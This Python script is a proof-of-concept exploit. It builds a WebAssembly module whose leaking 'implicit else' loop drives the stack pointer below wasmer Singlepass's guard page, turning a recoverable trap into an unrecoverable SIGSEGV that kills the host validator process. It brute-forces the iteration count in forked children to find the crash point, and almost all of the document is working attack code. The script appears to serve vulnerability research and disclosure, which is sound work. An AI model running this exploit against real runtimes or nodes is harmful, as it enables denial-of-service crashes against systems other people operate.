#!/usr/bin/env python3
"""
Escalation probe: can the Singlepass "implicit else" stack leak be turned from
a *recoverable* Wasm trap into an *unrecoverable* process crash?

Mechanism
---------
corosensei 0.3.4 (src/stack/unix.rs) maps the Wasm stack as

    mmap(len = size + 2 pages)              PROT_NONE
    mprotect(mmap + 4096, size)             READ|WRITE   <- usable stack
    base  = mmap + len                     (top)
    limit = mmap                            (bottom of the lower guard page)

and wasmer's trap handler (lib/vm/src/trap/traphandlers.rs) only recovers a
fault when the *stack pointer at the fault* is inside the stack:

    if !coro_trap_handler.stack_ptr_in_bounds(sp) { return false; }

Returning false makes the signal handler restore SIG_DFL and return, so the
faulting instruction is re-executed and the process dies with SIGSEGV.

The leak lowers RSP by one slot per iteration of an `if` with an *implicit*
else whose condition is false: the `add rsp, N` that releases the block's
return slots sits *before* the `label_else`, so the false branch jumps over
it.  `sub rsp, N` is a pure register operation and the value-stack slots are
addressed relative to RBP, so a loop that contains **no call** drifts RSP
arbitrarily far below the guard page without ever touching it.

Once RSP is below `limit`, the next `call` pushes the return address at
RSP-8 -- an unmapped address *below* the guard page.  The fault is then
reported with SP < limit, `stack_ptr_in_bounds(sp)` is false, the trap is not
recoverable and the validator process dies.

This script:
  1. builds a module with a leaking loop (no call inside) followed by a call,
  2. runs every candidate iteration count in a forked child,
  3. reports the exact iteration count where the child dies with SIGSEGV
     instead of returning the recoverable "call stack exhausted" trap.

Usage:
    python3 escalate.py [--from N] [--to N] [--prefix N] [--stack BYTES]
"""

import argparse
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                       # noqa: E402
from wasm_builder import (                                # noqa: E402
    I32, I64, Module, op_br_if, op_call, op_drop, op_end, op_i32_const,
    op_i32_eq, op_i32_sub, op_i64_const, op_if, op_local_get, op_local_set,
    op_local_tee, op_loop, op_nop, op_unreachable, op_block, op_else,
)


def build(iterations, prefix=4, probe_after=True, explicit_else=False):
    """A leaking loop (no calls) + a trailing call.

    `probe_after` adds the trailing `call $callee` that turns the drifted
    stack pointer into an unrecoverable fault.

    `explicit_else` builds the *control*: the very same module with an
    explicit `else`, which does not leak and must therefore never crash.
    """
    from upstream_regression import RESP

    m = Module()
    m.add_memory(2, export="memory")
    m.add_data(16, (64).to_bytes(4, "little") + len(RESP).to_bytes(4, "little")
               + len(RESP).to_bytes(4, "little"))
    m.add_data(64, RESP)
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))
    m.add_data(4096, (4).to_bytes(4, "little") + b"\x00\x00\x00\x00")

    t_pass = m.add_type([I64], [I64])

    # $callee: a trivial function; the call is only a `push` of the return
    # address, which is what faults when RSP is below the guard page.
    callee = m.add_func([], [], body=op_nop())

    b = bytearray()
    b += op_i32_const(iterations)
    b += op_local_set(3)                      # local 3 = counter

    b += op_loop()
    # register pressure: `prefix` live i64 values
    for _ in range(prefix):
        b += op_local_get(0)
    # the block parameter of the `if` (consumed by the block)
    b += op_local_get(0)
    # the condition is FALSE -> this is the path that skips the cleanup
    b += op_i32_const(0)
    b += op_if(t_pass)
    # the then-arm keeps the block parameter as the block result
    if explicit_else:
        b += op_else()
    b += op_end()
    # the block result is on the stack now
    b += op_drop()
    for _ in range(prefix):
        b += op_drop()

    b += op_local_get(3)
    b += op_i32_const(1)
    b += op_i32_sub()
    b += op_local_tee(3)
    b += op_br_if(0)
    b += op_end()

    if probe_after:
        b += op_call(callee)

    b += op_i32_const(1)
    check = m.add_func([I64, I32, I64], [I32], locals=[I32], body=bytes(b))

    ex = bytearray()
    ex += op_block()
    ex += op_i64_const(123) + op_i32_const(0) + op_i64_const(123)
    ex += op_call(check)
    ex += op_i32_const(1) + op_i32_eq() + op_br_if(0)
    ex += op_unreachable()
    ex += op_end()
    ex += op_i32_const(16)
    m.add_func([I32, I32, I32], [I32], body=bytes(ex), export="execute")
    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def run_child(wasm, stack_size):
    """Runs the module in this (forked) process; returns a status dict."""
    import tempfile
    out = {}
    vm = R.VM()
    base = tempfile.mkdtemp(prefix="wasmvm-esc-")
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    res, rep, err = vm.instantiate(cache, checksum, 1 << 62)
    if res.is_none:
        out["err"] = vm._vec_str(err)
        return out
    try:
        res2, rep2, err2 = vm.execute(cache, checksum, 1 << 62)
        out["err"] = vm._vec_str(err2)
    except Exception as exc:
        out["err"] = repr(exc)
    return out


def probe_inline(wasm, stack_size, wfd):
    """Runs the module in *this* thread with our own SIGSEGV handler.

    wasmer installs its trap handler lazily, on the first execution of Wasm
    code in the thread.  We therefore execute a trivial module first, so that
    wasmer's handler is already in place, and only then install ours on top
    of it: every fault (recoverable or not) is then observed here with its
    fault address, RSP and RIP.
    """
    import tempfile
    import signal_probe

    vm = R.VM()
    base = tempfile.mkdtemp(prefix="wasmvm-esc-")
    cache = vm.init_cache(base)

    # 1) trivial execution: forces wasmer's per-thread trap handler
    trivial = build(1, 0, False)
    csum = vm.store_code(cache, trivial, checked=True)
    res, rep, err = vm.instantiate(cache, csum, 1 << 62)
    if res.is_none:
        raise RuntimeError("trivial instantiate failed: %s" % vm._vec_str(err))
    vm.execute(cache, csum, 1 << 62)

    # 2) now our handler goes on top of wasmer's
    signal_probe.install(wfd)

    checksum = vm.store_code(cache, wasm, checked=True)
    res, rep, err = vm.instantiate(cache, checksum, 1 << 62)
    if res.is_none:
        raise RuntimeError("instantiate failed: %s" % vm._vec_str(err))
    vm.execute(cache, checksum, 1 << 62)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--from", dest="lo", type=int, default=130000)
    ap.add_argument("--to", dest="hi", type=int, default=140000)
    ap.add_argument("--prefix", type=int, default=4)
    ap.add_argument("--stack", type=int, default=1 << 20)
    ap.add_argument("--no-probe", action="store_true")
    ap.add_argument("--fault-probe", action="store_true",
                    help="capture fault_addr/RSP/RIP instead of the exit status")
    args = ap.parse_args()

    print("prefix=%d stack=%d probe_after=%s"
          % (args.prefix, args.stack, not args.no_probe))
    print("%-10s %-10s %s" % ("iters", "child", "detail"))

    if args.fault_probe:
        import signal_probe
        for n in range(args.lo, args.hi + 1):
            r_fd, w_fd = os.pipe()
            pid = os.fork()
            if pid == 0:
                os.close(r_fd)
                wasm = build(n, args.prefix, not args.no_probe)
                probe_inline(wasm, args.stack, w_fd)
                os._exit(0)
            os.close(w_fd)
            _, status = os.waitpid(pid, 0)
            data = os.read(r_fd, 4096).decode(errors="replace").strip()
            os.close(r_fd)
            tail = ""
            if status != 0:
                tail = "  [child status=%d]" % status
            print("%-10d %s%s" % (n, data or "(no fault observed)", tail))
            sys.stdout.flush()
        return

    deaths = []
    for n in range(args.lo, args.hi + 1):
        pid = os.fork()
        if pid == 0:
            wasm = build(n, args.prefix, not args.no_probe)
            r = run_child(wasm, args.stack)
            msg = (r.get("err") or "OK").replace("\n", " ")[:60]
            sys.stdout.write("%-10d %-10s %s\n" % (n, "returned", msg))
            sys.stdout.flush()
            os._exit(0)
        _, status = os.waitpid(pid, 0)
        if os.WIFSIGNALED(status):
            sig = os.WTERMSIG(status)
            print("%-10d %-10s signal=%d (%s)"
                  % (n, "DIED", sig, _signame(sig)))
            deaths.append((n, "signal %d" % sig))
            sys.stdout.flush()
        elif os.WIFEXITED(status) and os.WEXITSTATUS(status) != 0:
            print("%-10d %-10s exit=%d" % (n, "DIED", os.WEXITSTATUS(status)))
            deaths.append((n, "exit %d" % os.WEXITSTATUS(status)))
            sys.stdout.flush()

    print("\n== summary: %d process deaths" % len(deaths))
    for n, how in deaths[:20]:
        print("   iters=%d  %s" % (n, how))


def _signame(sig):
    try:
        import signal
        return signal.Signals(sig).name
    except Exception:
        return "?"


if __name__ == "__main__":
    main()
